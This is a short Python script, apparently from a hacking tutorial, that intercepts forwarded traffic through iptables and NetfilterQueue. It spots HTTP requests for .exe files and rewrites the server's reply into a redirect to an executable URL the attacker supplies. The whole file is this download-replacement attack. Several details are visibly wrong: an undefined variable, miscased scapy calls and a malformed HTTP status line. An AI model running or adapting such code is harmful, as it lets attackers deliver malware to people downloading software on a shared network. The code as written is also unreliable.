#Execute this bash before running code
#iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy

ack_list = []

def set_load(packet, load):
     scapy_packet[scapy.Raw].load = load
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     del packet[scapy.TCP].len
     del packet[scapy.IP].len   
     return packet

def process_packet(packet):
    scapy_packet =  scapy.IP(packet.get_payload())
    if scapy_packet.hasLayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("exe Request Detected")
                ack_list.append(scapy_packet[scapy.tcp].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.tcp].seq in ack_list:
                print("Replacing File...")
                modified_packet = set_load(scapy_packet, "HTTP /1.1 Moved Permanently\nLocation: #Specify url of exe file\n\n")
                packet.set_payload(str(modified_packet))
        
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()